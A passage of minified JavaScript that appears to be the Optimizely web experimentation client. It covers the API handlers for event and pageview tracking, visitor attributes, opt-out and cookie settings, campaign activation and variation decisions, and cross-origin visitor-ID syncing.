          O = t.ApiListenerError = d("ApiListenerError");
        t.event = function (n) {
          var t;
          switch (n.eventType) {
            case "click":
              t = function (n) {
                var t;
                return n.eventData && (t = p.create(n.eventData.id, n.eventData.apiName, "click", n.eventData)), function () {
                  var n = s.trackClickEvent(t);
                  n ? y.log("API / Tracking click event:", n) : y.log("API / Not tracking click event:", n);
                };
              }(n);
              break;
            case "decision":
              t = function (n) {
                var t = n.eventData,
                  e = w.createLayerState(t.layerId, t.experimentId, t.variationId, t.isLayerHoldback),
                  i = w.createSingle(t.layerId, t.experimentId, t.variationId);
                return function () {
                  w.recordLayerDecision(e.layerId, e.decisionTicket, e.decision), y.log("API / Tracking decision event:", e), s.trackDecisionEvent(e.decision, e.decisionTicket, i);
                };
              }(n);
              break;
            case "pageview":
              t = function (n) {
                var t = E.create(n.eventData.id, n.eventData.apiName),
                  e = E.createState(t.id);
                return function () {
                  var n = s.trackViewActivation(t, e);
                  n ? y.log("API / Tracking pageview event:", n) : y.log("API / Not tracking pageview event:", n);
                };
              }(n);
              break;
            default:
              t = function (n) {
                var t;
                return n.eventId && (t = p.create(n.eventId, n.eventName, "custom")), E.updateAllViewTags(), function () {
                  s.trackCustomEvent(n.eventName, n.tags, t) ? y.log("API / Tracking custom event:", n.eventName, n.tags) : y.log("API / Not tracking custom event:", n.eventName);
                };
              }(n);
          }
          R.getBucketingId() ? t() : m.dispatch(r.ADD_CLEANUP_FN, {
            lifecycle: c.Lifecycle.postActivate,
            cleanupFn: t
          });
        }, t.clientMetadata = function (n) {
          C;
        }, t.priorRedirectString = function (n) {}, t.microsnippetError = function (n) {}, t.rum = function (n) {
          m.dispatch(r.SET_RUM_DATA, n.eventData);
        }, t.initialViewStates = function (n) {
          var t = i.map(n.states, function (n, t) {
            return {
              id: t,
              isActive: n
            };
          });
          E.registerViews(t);
        }, t.page = function (n) {
          var t = k.getByApiName(n.pageName);
          if (!t) throw new Error('Unknown page "' + n.pageName + '"');
          var e = !n.hasOwnProperty("isActive") || n.isActive,
            i = function () {
              e ? E.activateViaAPI(t, n.tags) : (E.deactivate(t), y.log("API / Deactivated Page", E.description(t)));
            };
          R.getBucketingId() ? i() : m.dispatch(r.ADD_CLEANUP_FN, {
            lifecycle: c.Lifecycle.postViewsActivated,
            cleanupFn: i
          });
        }, t.tags = function (n) {
          E.setGlobalTags(n.tags);
        }, t.user = function (n) {
          y.log("API / Setting visitor custom attributes:", n.attributes), i.each(n.attributes, function (n, t) {
            var e,
              i,
              r = t,
              o = T.getById(t) || T.getByApiName(t);
            o && (r = o.id, e = o.apiName, i = o.segmentId || o.id);
            var a = {
              id: i,
              value: n
            };
            e && (a.name = e), x(r, a, !0);
          });
        };
        var x = function (n, t, e) {
          var i = [{
              key: e ? ["custom", n] : [n],
              value: t,
              metadata: {
                lastModified: v.now()
              }
            }],
            o = function () {
              m.dispatch(r.SET_VISITOR_ATTRIBUTES, {
                attributes: i
              });
            };
          R.getBucketingId() ? o() : m.dispatch(r.ADD_CLEANUP_FN, {
            lifecycle: c.Lifecycle.postVisitorProfileLoad,
            cleanupFn: o
          });
        };
        t.optOut = function (n) {
          var t = !n.hasOwnProperty("isOptOut") || n.isOptOut;
          h.setOptOut(t);
        }, t.cookieExpiration = function (n) {
          var t = n.cookieExpirationDays;
          t < 90 && (y.error('Argument "cookieExpirationDays"=', t, "less than minimum days:", 90, ", setting to minimum."), t = 90), y.log("API / Setting cookie age to", t, "days."), m.dispatch(r.SET_COOKIE_AGE, 86400 * t);
        }, t.extendCookieLifetime = function (n) {
          n = i.extend({
            isEnabled: !0
          }, n), y.log("API / Setting cookie automatic lifetime extension to", n.isEnabled), m.dispatch(r.SET_COOKIE_AUTO_REFRESH, n.isEnabled);
        }, t.cookieDomain = function (n) {
          y.log("API / Setting cookie domain to", n.cookieDomain), m.dispatch(r.SET_COOKIE_DOMAIN, n.cookieDomain);
        }, t.disable = function (n) {
          if (n.scope) {
            if ("tracking" !== n.scope) throw new Error('Unknown "scope" for disable: ' + n.scope);
            y.log("API / Disabling tracking"), m.dispatch(r.LOAD_DIRECTIVE, {
              trackingDisabled: !0
            });
          } else y.log("API / Disabling everything"), m.dispatch(r.LOAD_DIRECTIVE, {
            disabled: !0
          });
        }, t.log = function (n) {
          var t = n.level,
            e = n.match;
          i.isUndefined(t) && (t = "INFO"), i.isUndefined(e) && (e = ""), y.setLogMatcher(e), y.setLogLevel(t);
        }, t.registerModule = function (n) {
          var t = "custom/" + n.moduleName;
          if (a[t] || o.get(t)) throw new Error('Module name "' + t + '" is reserved. Will not be registered as plugin.');
          b.registerApiModule(t, n.module);
        }, t.dataFromSource = function (n) {
          var t = n.source;
          l.makeAsyncRequest(t), l.resolveRequest(t, n.data);
        }, t.addListener = function (n) {
          if (!i.isFunction(n.handler)) throw new Error("A handler function must be supplied");
          (n = i.omit(n, "type")).publicOnly = !0, n.emitErrors = !0;
          var t = n.handler;
          n.handler = function (n) {
            try {
              return t(n);
            } catch (e) {
              throw new O(e);
            }
          }, g.on(n);
        }, t.removeListener = function (n) {
          if (!n.token) throw new Error("Must supply a token to removeListener");
          g.off(n.token);
        }, t.load = function (n) {
          n.data = i.extend({}, n.data), u.normalizeClientData(n.data), m.dispatch(r.DATA_LOADED, {
            data: n.data
          });
        }, t.integrationSettings = function (n) {
          if (!n.id) throw new Error("id is required");
          if (!n.settings) throw new Error("settings is required");
          m.dispatch(r.SET_INTEGRATION_SETTINGS, i.extend({}, n.settings, {
            id: n.id
          }));
        }, t.bucketVisitor = function (n) {
          if (!n.variationId && i.isUndefined(n.variationIndex) || n.variationId && n.variationIndex) throw new Error("One of a variationId or a variationIndex is required.");
          if (!n.experimentId) throw new Error("An experimentId is required.");
          var t,
            e,
            r = n.campaignId;
          if (r) {
            if (!(t = N.get(r))) throw new Error("Could not find layer " + r);
          } else if (!(r = (t = N.getLayerByExperimentId(n.experimentId)).id)) throw new Error("Could not find layer for experiment " + n.experimentId);
          if (!(e = i.find(t.experiments, {
            id: n.experimentId
          }))) throw new Error("Could not find experiment " + n.experimentId + " in layer " + r);
          var o = n.variationId;
          if (i.isUndefined(n.variationIndex)) {
            if (!i.find(e.variations, {
              id: o
            })) throw new Error("Cound not find variation " + o + " in experiment " + n.experimentId);
          } else if (!(o = e.variations[n.variationIndex].id)) throw new Error("Could not find variation at index " + n.variationIndex + " in experiment " + n.experimentId);
          I.updateVariationIdMap(r, n.experimentId, o), R.getBucketingId() && I.persistVariationIdMap();
        }, t.waitForOriginSync = function (n) {
          if (!i.isArray(n.canonicalOrigins)) throw new Error("canonicalOrigins must be an array. Got: " + _.stringify(n.canonicalOrigins));
          i.each(n.canonicalOrigins, function (n) {
            if (!i.isString(n)) throw new Error("Each item in canonicalOrigins must be a string. Found type " + (void 0 === n ? "undefined" : (t = n) && "undefined" != typeof Symbol && t.constructor === Symbol ? "symbol" : typeof t));
            var t;
          }), m.dispatch(r.XDOMAIN_SET_CANONICAL_ORIGINS, {
            canonicalOrigins: n.canonicalOrigins
          });
        }, t.disableCrossOrigin = function () {
          y.log("API / cross origin tracking is DISABLED"), m.dispatch(r.XDOMAIN_SET_DISABLED, {
            disabled: !0
          });
        }, t.activate = function () {
          D.shouldActivate() ? (i.forEach(S.getActiveViewStates(), function (n) {
            E.deactivate(k.get(n.id));
          }), m.dispatch(r.RESET_VIEW_STATES), f.emitActivateEvent()) : y.debug("Not activating.");
        }, t.sendEvents = function () {
          f.emitSendEvents();
        }, t.holdEvents = function () {
          f.emitHoldEvents();
        };
      },
      5830: function () {},
      8821: function (n, t, e) {
        var i = e(9576),
          r = e(6639).U,
          o = t.ActivationCodeError = r("ActivationCodeError"),
          a = t.ProjectJSError = r("ProjectJSError"),
          u = e(9289),
          c = e(2805),
          s = e(9126),
          f = e(2438),
          l = e(6621),
          d = e(7989),
          v = e(8955),
          h = e(3792),
          p = e(3378),
          g = e(4041),
          m = e(4819),
          _ = e(6954),
          w = e(8964),
          y = e(4658),
          b = e(7356),
          E = e(9404),
          I = e(4797),
          A = e(1722),
          T = e(4604),
          S = e(4243).mM,
          k = e(2678),
          R = e(1645),
          N = e(9e3),
          D = e(2376),
          C = e(7984),
          O = e(8398).Promise,
          x = e(1705),
          P = e(6928),
          M = e(9418),
          L = e(7246),
          V = e(9840),
          F = e(1685),
          U = e(2188),
          z = (g = e(4041)).get("stores/session"),
          j = g.get("stores/audience_data"),
          G = g.get("stores/action_data"),
          B = g.get("stores/cleanup"),
          q = g.get("stores/directive"),
          H = g.get("stores/global"),
          Y = g.get("stores/group_data"),
          K = g.get("stores/layer_data"),
          $ = g.get("stores/layer"),
          W = g.get("stores/pending_events"),
          X = g.get("stores/plugins"),
          J = g.get("stores/rum"),
          Q = g.get("stores/visitor"),
          Z = g.get("stores/view_data"),
          nn = g.get("stores/view"),
          tn = g.get("stores/visitor_id"),
          en = g.get("stores/visitor_bucketing"),
          rn = g.get("stores/xdomain"),
          on = e(7431),
          an = e(6708),
          un = e(8562),
          cn = t;
        function sn() {
          var n = null;
          i.isNumber(n) && 0 === K.getCount() ? (k.log("Activating after delay of", n, "ms because no Experiments are running"), I.dispatch(c.SET_RUM_DATA, {
            data: {
              activateDfd: !0
            }
          }), U.setTimeout(f.emitActivateEvent, n)) : f.emitActivateEvent();
        }
        function fn(n) {
          an.handleError(n.data.error, n.data.metadata);
        }
        function ln(n, t) {
          I.dispatch(c.SET_RUM_DATA, {
            data: {
              extras: {
                xdAttempt: n,
                xdError: t ? t.toString() : void 0
              }
            }
          });
        }
        function dn(n, t, e) {
          n = n || [];
          var r = X.getAllPlugins(w.PluginTypes.visitorProfileProviders),
            o = H.getGlobalHoldbackThreshold(),
            a = Q.getVisitorProfile();
          F.populateLazyVisitorData(r, a);
          var u = tn.getBucketingId();
          if (!u) throw new Error("bucketingId not set");
          var c,
            s = Q.getVisitorProfile();
          t && (c = en.getVariationIdMap()[t.id]);
          var f = {
            bucketingId: u,
            visitorProfile: s,
            audiences: n,
            globalHoldback: o,
            preferredVariationMap: c,
            layer: t
          };
          return t && e && p.isPageIdRelevant(t) ? i.map(e, function (n) {
            return p.createTicket(i.extend({}, f, {
              pageId: n
            }));
          }) : [p.createTicket(f)];
        }
        function vn(n, e, r, o) {
          try {
            var a = function (n) {
                return {
                  bucketingId: tn.getBucketingId(),
                  preferredLayerId: en.getPreferredLayerMap()[n.id]
                };
              }(o),
              u = p.decideGroup(o, a);
            if (u.reason) return k.debug("Not activating Group", A.description(o), "; reason:", u.reason), J.getSampleRum() && I.dispatch(c.RECORD_LAYER_FEATURE_USAGE, {
              feature: "mutex",
              entityId: o.id
            }), O.resolve();
            var s = K.get(u.layerId);
            if (!s) return k.debug("Visitor was bucketed into a Campaign (" + u.layerId + ") which is not in this snippet"), O.resolve();
            var f = i.filter(s.pageIds, i.partial(i.includes, r));
            return i.isEmpty(f) ? (k.debug("Not activating Group", A.description(o), "; reason: visitor was bucketed into a Campaign/Experiment not related to the currently-activating Page(s)"), O.resolve()) : (J.getSampleRum() && I.dispatch(c.RECORD_LAYER_FEATURE_USAGE, {
              feature: "mutex",
              entityId: o.id
            }), t.decideAndExecuteLayerASAP(n, e, f, s));
          } catch (l) {
            return k.error("Error getting decision for Group", A.description(o), "; ", l), O.reject(l);
          }
        }
        function hn(n, t) {
          var e = {};
          return i.each(n, function (n) {
            i.isArray(n) ? i.extend(e, hn(n, t)) : i.isObject(n) && t[n.type] && (e[n.type] = !0);
          }), e;
        }
        function pn(n) {
          var t = [];
          return i.each(n, function (n) {
            t.push(n.name, n);
          }), t;
        }
        function gn(n) {
          var t = B.getCleanupFns(n);
          if (t.length > 0) {
            for (; t.length > 0;) t.shift()();
            I.dispatch(c.CLEAR_CLEANUP_FN, {
              lifecycle: n
            });
          }
        }
        t.initialize = function (n) {
          return this.initGlobalStore(n.clientData), this.initializePlugins(n.plugins);
        }, t.initGlobalStore = function (n) {
          v.normalizeClientData(n), y.on({
            filter: {
              type: "error"
            },
            handler: fn
          }), I.dispatch(c.DATA_LOADED, {
            data: n
          }), k.log("Initialized with DATA:", n);
        }, t.initializePlugins = function (n) {
          if (i.isArray(window.optimizely) && (window.optimizely = i.filter(window.optimizely, function (n) {
            var t = !0;
            return !on.push(n, t);
          })), m.setOptOut(q.shouldOptOut()), !q.isDisabled() && !q.shouldOptOut()) {
            un.queueBeacons(), _.isReady() ? I.dispatch(c.SET_DOMCONTENTLOADED) : _.addReadyHandler(function () {
              I.dispatch(c.SET_DOMCONTENTLOADED);
            }), N.time("projectJS");
            var e = H.getProjectJS();
            if (i.isFunction(e)) try {
              E.apply(e);
            } catch (v) {
              k.error("Error while executing projectJS: ", v), d.emitError(new a(v));
            }
            N.timeEnd("projectJS"), i.each(n || [], function (n) {
              try {
                n(D);
              } catch (v) {
                d.emitInternalError(v);
              }
            }), i.each(H.getPlugins() || [], function (n) {
              try {
                E.apply(n, [D]);
              } catch (v) {
                d.emitError(v);
              }
            }), P.load();
            var r = y.on({
              filter: {
                type: "lifecycle",
                name: "activated"
              },
              handler: function () {
                Q.observe(F.persistVisitorProfile), $.observe(F.persistLayerStates), z.observe(F.persistSessionState), W.observe(R.persistPendingEvents), en.observe(F.persistVisitorBucketingStore), y.off(r);
              }
            });
            y.on({
              filter: {
                type: "lifecycle",
                name: "viewsActivated"
              },
              handler: t.onViewsActivated
            }), y.on({
              filter: {
                type: "lifecycle",
                name: "pageDeactivated"
              },
              handler: t.onPageDeactivated
            }), t.initializeApi();
            var o = R.getPendingEvents();
            if (o && (I.dispatch(c.LOAD_PENDING_EVENTS, {
              events: o
            }), R.retryPendingEvents(o)), y.on({
              filter: {
                type: "lifecycle",
                name: "activate"
              },
              handler: t.activate
            }), f.emitInitializedEvent(), !q.shouldActivate()) return O.resolve();
            var u = [];
            if (rn.isDisabled()) sn();else {
              var s = t.initializeXDomainStorage();
              if (u.push(s), Boolean(rn.getCanonicalOrigins())) {
                var l = M.makeTimeoutPromise(1e3);
                O.race([s, l])["catch"](function (n) {
                  k.error("Failed to initialize xDomain storage: ", n);
                }).then(sn)["catch"](an.handleError);
              } else sn();
            }
            return O.all(u);
          }
          k.log("Controller / Is disabled");
        }, t.activate = function () {
          try {
            var n = [];
            k.log("Activated client"), gn(w.Lifecycle.preActivate);
            var t = h.now();
            I.dispatch(c.ACTIVATE, {
              activationId: String(t),
              activationTimestamp: t
            });
            var e = Z.getAll();
            V.registerViews(e), F.setId(F.getOrGenerateId()), n.push(s.trackPostRedirectDecisionEvent()), I.dispatch(c.MERGE_VARIATION_ID_MAP, {
              variationIdMap: F.getVariationIdMap()
            }), I.dispatch(c.MERGE_PREFERRED_LAYER_MAP, {
              preferredLayerMap: F.getPreferredLayerMap()
            }), gn(w.Lifecycle.postVisitorProfileLoad), n.push((v = X.getAllPlugins(w.PluginTypes.visitorProfileProviders), g = Q.getVisitorProfile(), F.populateEagerVisitorData(v, g)).then(function () {
              k.log("Populated visitor profile");
            }));
            var r = dn(),
              o = p.decideGlobal(r);
            k.log("Made global decision", r, "->", o), I.dispatch(c.RECORD_GLOBAL_DECISION, o);
            var a = s.trackClientActivation();
            a ? k.log("Tracked activation event", a) : k.log("Not tracking activation event");
            var u = cn.setUpViewActivation(e),
              l = [];
            return i.each(u, function (n) {
              l = l.concat(V.activateMultiple([n]));
            }), gn(w.Lifecycle.postViewsActivated), gn(w.Lifecycle.postActivate), f.emitActivatedEvent(), O.all(n).then(function () {
              y.emit({
                type: b.TYPES.LIFECYCLE,
                name: "activateDeferredDone"
              }), k.log("All immediate effects of activation resolved");
            }, d.emitError);
          } catch (m) {
            return d.emitError(m), O.reject(m);
          }
          var v, g;
        }, cn.setUpViewActivation = function (n) {
          var t = [];
          return i.each(n, function (n) {
            i.isBoolean(nn.getViewState(n.id).isActive) && V.isActivationTypeImmediate(n.activationType) ? k.debug("Skipping page: already evaluated, presumably at the edge", V.description(n)) : V.shouldTriggerImmediately(n.activationType) ? t.push(n) : n.activationType === w.ViewActivationTypes.callback ? (k.debug("Setting up conditional activation for Page", V.description(n)), cn.activateViewOnCallback(n)) : n.activationType === w.ViewActivationTypes.polling ? (k.debug("Setting up polling activation for Page", V.description(n)), C.pollFor(i.partial(E.apply, n.activationCode), null, i.partial(L.isTimedOut, h.now())).then(function () {
              V.activateMultiple([n]);
            })["catch"](function (t) {
              k.warn("Failed to activate view ", n, t);
            })) : n.activationType !== w.ViewActivationTypes.manual && d.emitError(new Error("Unknown view activationType: " + n.activationType));
          }), t;
        }, cn.activateViewOnCallback = function (n) {
          var t = {
            pageId: n.id
          };
          Object.defineProperty(t, "isActive", {
            get: function () {
              return nn.isViewActive(n.id);
            }
          });
          try {
            E.apply(n.activationCode, [function (t) {
              var e = i.extend({}, t, {
                pageName: n.apiName,
                type: "page"
              });
              on.push(e);
            }, t]);
          } catch (r) {
            var e = new o("(" + r.toString() + ") in activationCode for " + V.description(n));
            d.emitError(e, {
              originalError: r,
              userError: !0
            });
          }
        }, t.onViewsActivated = function (n) {
          var e,
            r = n.data.views,
            o = i.map(r, "id");
          try {
            if (!tn.getBucketingId()) throw new Error("View activated with no visitorId set");
            var a = function (n) {
              var e = K.getAllByPageIds(n),
                r = q.getForceVariationIds(),
                o = q.getForceAudienceIds(),
                a = !i.isEmpty(r);
              a && k.log("Force variations are in use. Disabling mutual exclusivity.");
              var u = a ? {
                individual: e
              } : i.reduce(e, function (n, t) {
                return t.groupId ? n.groups[t.groupId] || (n.groups[t.groupId] = Y.get(t.groupId)) : n.individual.push(t), n;
              }, {
                groups: {},
                individual: []
              });
              k.log("Deciding Campaigns/Experiments for Page(s)", n);
              var c = i.map(u.groups, A.description).join(", ");
              k.log("Groups:", c);
              var s = i.map(u.individual, T.description).join(", ");
              k.log("Campaigns/Experiments not in Groups (by Campaign id):", s);
              var f = i.map(u.groups, i.partial(vn, r, o, n)) || [],
                l = i.map(u.individual, function (e) {
                  var a = i.filter(e.pageIds, i.partial(i.includes, n));
                  return t.decideAndExecuteLayerASAP(r, o, a, e);
                }),
                d = f.concat(l);
              return O.all(d).then(function (t) {
                var e = i.filter(t, function (n) {
                  return !!n;
                });
                return k.log("All Campaigns/Experiments for Page(s) (by Campaign id)", n, "resolved:", i.map(e, T.description).join(", ")), e;
              });
            }(o)["catch"](d.emitError);
            return e = O.all(i.map(r, function (n) {
              var t = function () {
                V.parseViewTags(n);
                var t = s.trackViewActivation(n);
                t ? k.log("Tracked activation for Page", V.description(n), t) : k.log("Not Tracking activation for Page", V.description(n));
              };
              return _.isReady() ? O.resolve(t()) : C.pollFor(_.isReady, 1e3).then(t);
            })), O.all([a, e]);
          } catch (u) {
            d.emitError(u);
          }
        }, t.onPageDeactivated = function (n) {
          var t = n.data.page,
            e = G.getAllActionIdsByPageId(t.id);
          i.each(e, function (n) {
            var e = G.getActionState(n);
            e && (i.each(e, function (n, e) {
              if (n.cancel) try {
                n.cancel(), k.debug("Controller / Canceled change", e, "observation due to deactivation of page:", t);
              } catch (i) {
                k.error("Controller / Error canceling change", e, "observation upon deactivation of page.", i);
              }
              if (t.undoOnDeactivation && n.undo) try {
                n.undo(), k.debug("Controller / Undid change", e, "due to deactivation of page:", t);
              } catch (r) {
                k.error("Controller / Error undoing change upon deactivation of page.", r);
              }
            }), I.dispatch(c.REMOVE_ACTION_STATE, {
              actionId: n
            }), k.debug("Controller / Undid changes and/or canceled change observation due to deactivation of page:", t, n));
          });
        }, t.initializeApi = function () {
          var n = {
            push: on.push
          };
          n.get = on.get;
          var t = window.optimizely;
          i.isArray(t) && i.each(t, function (t) {
            n.push(t);
          }), n.data = {
            note: "Obsolete, use optimizely.get('data') instead"
          }, n.state = {}, window.optimizely = n;
        }, t.persistItemsWithId = function (n) {
          return i.each(n, function (n, t) {
            F.checkKeyForVisitorId(t) && S.setItem(t, n);
          }), n;
        }, t.initializeXDomainStorage = function () {
          var n = e(7581),
            r = !!F.getCurrentId(),
            o = !!r && F.hasSomeData();
          r ? o ? k.log("xd / Existing visitor; has data on this origin") : k.log("xd / Existing visitor; new to this origin") : k.log("xd / New visitor");
          var a = H.getAccountId(),
            u = "https://a17202440929.cdn.optimizely.com".replace("__SUBDOMAIN__", "a" + a + "."),
            s = "/client_storage/a" + a + ".html";
          n.subscribe(function (n, t) {
            F.checkKeyForVisitorId(n) && S.setItem(n, t);
          });
          var l = n.fetchAll().then(function (t) {
            if (!tn.getVisitorIdLocator()) {
              var e = rn.getCanonicalOrigins();
              if (e) {
                var i = n.getXDomainUserId(t, e);
                i && (k.log("Syncing cross-origin visitor randomId:", i), F.maybePersistVisitorId({
                  randomId: i
                }));
              }
            }
            return F.deleteOldForeignData(), t;
          }).then(t.persistItemsWithId).then(function (n) {
            if (F.loadForeignData(), r && !o) {
              var t = !i.isEmpty(n);
              k.debug("xd / Loaded foreign data? ", t), ln(t);
            }
            k.log("Loaded visitor data from foreign origins"), f.emitOriginsSyncedEvent();
          }, function (n) {
            throw r && !o && (k.debug("xd / Failed to load foreign data:", n), ln(!1, n)), n;
          });
          return O.all([n.load(u, s)["catch"](function (n) {
            throw k.debug("xd / Failed to load iframe:", n), r && !o && ln(!1, n), n;
          }), l["catch"](function (n) {
            k.debug("xd / Ignored error syncing foreign data (expected if waitForOriginSync used):", n.message), k.debug("xd / Enqueuing sync to happen after visitorId set."), I.dispatch(c.ADD_CLEANUP_FN, {
              lifecycle: w.Lifecycle.postVisitorProfileLoad,
              cleanupFn: f.emitOriginsSyncedEvent
            });
          })]);
        }, t.decideAndExecuteLayerASAP = function (n, e, r, o) {
          return new O(function (a, d) {
            try {
              !function (n, t, e, r, o) {
                if (t.length || e.length) return void o(dn([], void 0, r));
                var a = T.relatedAudienceIds(n),
                  u = i.reduce(a, function (n, t) {
                    var e = j.get(t);
                    return !e || n.push(e), n;
                  }, []),
                  s = X.getAllPlugins(w.PluginTypes.audienceMatchers);
                if (J.getSampleRum()) {
                  var f = {};
                  if (i.each(u, function (n) {
                    i.extend(f, hn(n.conditions, s));
                  }), !i.isEmpty(f)) {
                    var d = i.keys(f);
                    I.dispatch(c.RECORD_AUDIENCE_USAGE, {
                      audienceTypes: d,
                      layerId: n.id
                    });
                  }
                }
                !function (n, t, e, r) {
                  var o = i.reduce(n, function (n, e) {
                      return i.extend(n, l.requiredAudienceFieldsForConditions(e.conditions, t));
                    }, {}),
                    a = i.reduce(o, function (n, t) {
                      if (i.isUndefined(F.getAttribute(t))) {
                        var e = F.getPendingAttributeValue(t);
                        i.isUndefined(e) || n.push(e);
                      }
                      return n;
                    }, []);
                  if (0 === a.length) return r();
                  var u = [].concat(n),
                    c = x.firstToResolve(i.map(a, function (n) {
                      return O.resolve(n).then(function () {
                        var n = Q.getVisitorProfile();
                        if (u = i.filter(u, function (e) {
                          return i.isUndefined(l.isInAudience(n, e, t));
                        }), !i.isEmpty(u)) throw new Error("At least one audience is still pending");
                      });
                    }));
                  O.race([c, new O(function (n, t) {
                    U.setTimeout(t, e);
                  })]).then(function () {
                    k.log("Activating Campaign after pending Audiences resolved", n), r();
                  }, function () {
                    k.log("Activating Campaign after timeout on Audiences", n), r();
                  });
                }(u, s, T.getActivationTimeout(n), function () {
                  var t = dn(u, n, r);
                  i.map(t, function (t) {
                    !function (n, t, e) {
                      var r = i.map(n.audienceIds, i.bind(j.get, j)),
                        o = i.filter(t, function (t) {
                          return !i.includes(n.audienceIds, t.id);
                        });
                      k.log("When deciding Campaign", T.description(e), "visitor is in audiences:", pn(r), "and not in audiences:", pn(o));
                    }(t, u, n);
                  }), o(t);
                });
              }(o, n, e, r, function (l) {
                i.each(l, function (a) {
                  var l = a.pageId ? [a.pageId] : r;
                  k.debug("Deciding layer: ", o, "with decisionTicket: ", a, "and actionViewIds: ", l), function (n, e, r, o, a) {
                    var l = T.description(n);
                    k.log("Activating Campaign", l, "on Page(s)", o), r.length && (k.log("Applying force audienceIds:", r, "to Campaign", l), (a = i.cloneDeep(a)).audienceIds = r);
                    var d = t.decideLayer(n, a, e),
                      v = !(!e.length && !r.length),
                      h = t.getActionsForDecision(n, d, v),
                      g = function (n, t) {
                        return i.filter(n, function (n) {
                          return i.isUndefined(n.pageId) || i.includes(t, n.pageId);
                        });
                      }(h.actions, o);
                    if (h.maybeExecute && function (n, t, e, r) {
                      var o = T.description(t);
                      k.log("Preparing actions", n, "for Campaign", o, "on Page(s)", r), i.forEach(n, u.prepareAction);
                    }(g, n, 0, o), i.forEach(o, function () {
                      s.trackDecisionEvent(d, a);
                    }), f.emitLayerDecided({
                      layer: n,
                      decisionTicket: a,
                      decision: d
                    }), d.error) throw d.error;
                    if (J.getSampleRum()) {
                      I.dispatch(c.RECORD_LAYER_POLICY_USAGE, {
                        policy: n.policy,
                        layerId: n.id
                      });
                      var m = function (n) {
                        var t = {};
                        return i.each(n, function (n) {
                          i.each(n.changeSet, function (n) {
                            t[n.type] || (t[n.type] = !0);
                          });
                        }), t;
                      }(h.actions);
                      I.dispatch(c.RECORD_CHANGE_TYPE_USAGE, {
                        changeTypes: i.keys(m),
                        layerId: n.id
                      }), i.isEmpty(n.integrationSettings) || I.dispatch(c.RECORD_INTEGRATION_USAGE, {
                        integrations: T.getIntegrationTypes(n),
                        layerId: n.id
                      });
                    }
                    if (!p.isInCohort(d)) return void k.log("Not activating Campaign: " + T.description(n) + "; not in the cohort because:", d.reason);
                    h.maybeExecute && function (n, t, e, r) {
                      var o = T.description(t);
                      k.log("Executing actions", n, "for Campaign", o, "on Page(s)", r), O.all(i.map(n, function (n) {
                        return u.executePreparedAction(n).then(i.partial(f.emitActionAppliedEvent, n));
                      })).then(function () {
                        k.log("All page actions for", e, "applied:", n), f.emitActionsForDecisionAppliedEvent(e, n);
                      })["catch"](function (n) {
                        k.warn("Error evaluating page actions for decision", e, "because:", n);
                      });
                    }(g, n, d, o);
                  }(o, n, e, l, a);
                }), a(o);
              });
            } catch (v) {
              k.error("Error getting decision for Campaign: " + T.description(o), v), d(v);
            }
          });
        }, t.decideLayer = function (n, t, e) {
          var i;
          var r = T.description(n);
          i = e.length ? p.getDummyLayerDecision(n, e) : p.decideLayer(n, t), k.log("Recording decision for Campaign", r, t, "->", i), T.recordLayerDecision(n.id, t, i), i.variationId && i.experimentId && F.updateVariationIdMap(n.id, i.experimentId, i.variationId), n.groupId && F.updatePreferredLayerMap(n.groupId, n.id);
          return i;
        }, t.getActionsForDecision = function (n, t, e) {
          var i = T.description(n),
            r = "NOT applying changes for Campaign",
            o = {
              actions: [],
              maybeExecute: !1
            };
          if (o.actions = [].concat(G.getLayerActions(t.layerId) || [], G.getExperimentActions(t.experimentId) || [], G.getExperimentVariationActions(t.experimentId, t.variationId) || []), !e && H.isGlobalHoldback()) return k.log(r, i, "(visitor is in global holdback)"), o;
          if (t.isLayerHoldback) return k.log(r, i, "(visitor is in layer holdback)"), o;
          if (!t.experimentId || !t.variationId) return k.log(r, i, "(visitor is not eligible for any Experiments)"), o;
          return o.maybeExecute = !0, k.log("Got Actions for Campaign:", i, o.actions), o;
        };
      },
      2174: function (n, t, e) {
        var i = e(44).Promise,
          r = e(3792),
          o = e(4041).get("stores/plugins"),
          a = e(8964),
          u = e(2678);
        t.create = function (n, t, e) {
          var c = {
            identifier: n.id,
            action: t,
            startTime: e || r.now()
          };
          try {
            var s = o.getPlugin(a.PluginTypes.changeAppliers, n.type);
            if (!s) throw new Error("Unrecognized change type " + n.type);
            return new s(n, c);
          } catch (f) {
            return u.error("Change applier was never properly constructed:", f), {
              apply: function () {
                return i.reject(f);
              }
            };
          }
        };
      },
      8235: function (n) {
        n.exports = {
          SELECTOR_POLLING_MAX_TIME: 2e3,
          CHANGE_DATA_KEY: "optimizelyChangeData",
          CHANGE_ID_ATTRIBUTE_PREFIX: "data-optly-"
        };
      },
      4611: function (n, t, e) {
        var i = e(9576),
          r = e(8235).CHANGE_DATA_KEY;
        function o(n, t) {
          return [n, t].join("_");
        }
        t.getData = function (n, t, e) {
          var i = o(t, e);
          return n[r] && n[r][i] ? n[r][i] : null;
        }, t.hasData = function (n) {
          return Boolean(n && n[r] && !i.isEmpty(n[r]));
        }, t.removeData = function (n, t, e) {
          n[r] && delete n[r][o(t, e)];
        }, t.setData = function (n, t, e, i) {
          if ("object" != typeof i) throw new Error("setData expects an object");
          n[r] || (n[r] = {}), n[r][o(t, e)] = i;
        };
      },
      5557: function (n, t, e) {
        var i = e(2624);
        n.exports = {
          changeType: {
            CUSTOM_CODE: "custom_code",
            ATTRIBUTE: "attribute",
            APPEND: "append",
            REARRANGE: "rearrange",
            REDIRECT: "redirect",
            WIDGET: "widget"
          },
          DOMInsertionType: {
            AFTER: "after",
            APPEND: "append",
            BEFORE: "before",
            PREPEND: "prepend"
          },
          insertAdjacentHTMLType: {
            AFTER_BEGIN: "afterbegin",
            AFTER_END: "afterend",
            BEFORE_BEGIN: "beforebegin",
            BEFORE_END: "beforeend"
          },
          selectorChangeType: {
            CLASS: "class",
            HTML: "html",
            HREF: "href",
            SRC: "src",
            STYLE: "style",
            TEXT: "text",
            HIDE: "hide",
            REMOVE: "remove"
          },
          changeApplierState: i({
            APPLIED: null,
            APPLYING: null,
            UNAPPLIED: null,
            UNDOING: null
          }),
          changeState: i({
            BLOCKED: null,
            UNAPPLIED: null,
            APPLIED: null,
            APPLYING: null,
            UNDOING: null,
            TIMED_OUT: null,
            IGNORED: null,
            ERROR: null
          })
        };
      },
      9289: function (n, t, e) {
        var i = e(9576),
          r = e(2805),
          o = e(7989),
          a = e(3113),
          u = e(6639).U,
          c = e(3792),
          s = e(4041),
          f = e(4797),
          l = e(2678),
          d = e(8398).Promise,
          v = e(5554),
          h = s.get("stores/global"),
          p = s.get("stores/action_data"),
          g = s.get("stores/change_data"),
          m = s.get("stores/session"),
